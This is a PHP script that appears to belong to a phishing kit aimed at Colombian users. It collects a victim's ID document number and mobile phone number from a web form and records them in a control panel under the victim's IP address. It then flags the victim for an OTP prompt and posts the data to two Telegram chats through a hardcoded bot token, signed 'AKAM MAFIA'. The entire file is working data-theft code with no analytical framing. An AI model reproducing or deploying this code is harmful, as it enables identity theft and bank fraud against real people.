<?php
require_once('../panel/lib/funciones.php');
date_default_timezone_set('America/Bogota');

$ip = $_SERVER['REMOTE_ADDR'];
$documento = isset($_POST['doc']) ? $_POST['doc'] : '';
$celular = isset($_POST['cel']) ? $_POST['cel'] : '';

if (!empty($documento)) {
    // 1. Guardar en Panel
    if (function_exists('traer_regitro')) {
        $registro = traer_regitro($ip);
        actualizar_registro_info($registro, $documento, $celular);
    }

    // 2. CAMBIO DE ESTADO A 2 (Para que pida Dinámica / OTP.php)
    if (function_exists('actualizar_estado_victima')) {
        actualizar_estado_victima($ip, "2"); 
    }

    // 3. Envío a Telegram 𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐
    $token = "8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA";
    $chat_ids = ["8114050673", "8518977918"];
    
    $mensaje = "⭐ <b>𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 - INFO</b> ⭐\n\n";
    $mensaje .= "👤 IP: <code>$ip</code>\n";
    $mensaje .= "🪪 Doc: <code>$documento</code>\n";
    $mensaje .= "📱 Cel: <code>$celular</code>\n";
    $mensaje .= "━━━━━━━━━━━━━━━";

    foreach ($chat_ids as $id) {
        $url = "https://api.telegram.org/bot$token/sendMessage";
        $data = ['chat_id' => $id, 'text' => $mensaje, 'parse_mode' => 'HTML'];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch);
        curl_close($ch);
    }
}
echo "ok";
?>
